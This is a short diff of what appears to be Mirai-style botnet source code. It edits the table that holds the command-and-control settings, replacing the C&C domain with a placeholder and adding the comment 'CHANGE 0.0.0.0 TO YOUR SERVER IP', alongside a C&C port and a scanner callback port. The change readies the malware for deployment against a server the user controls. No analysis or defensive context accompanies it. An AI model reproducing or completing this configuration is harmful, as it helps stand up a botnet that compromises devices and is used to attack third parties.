@@ -13,8 +13,8 @@ static void toggle_obf(uint8_t id) {
 }
 
 void table_init(void) {
-    /* CNC configuration */
-    table[TABLE_CNC_DOMAIN] = "127.0.0.1";
+    /* CNC configuration - CHANGE 0.0.0.0 TO YOUR SERVER IP */
+    table[TABLE_CNC_DOMAIN] = "0.0.0.0";
     table[TABLE_CNC_PORT] = "3778";
     table[TABLE_SCAN_CB_PORT] = "9555";
 
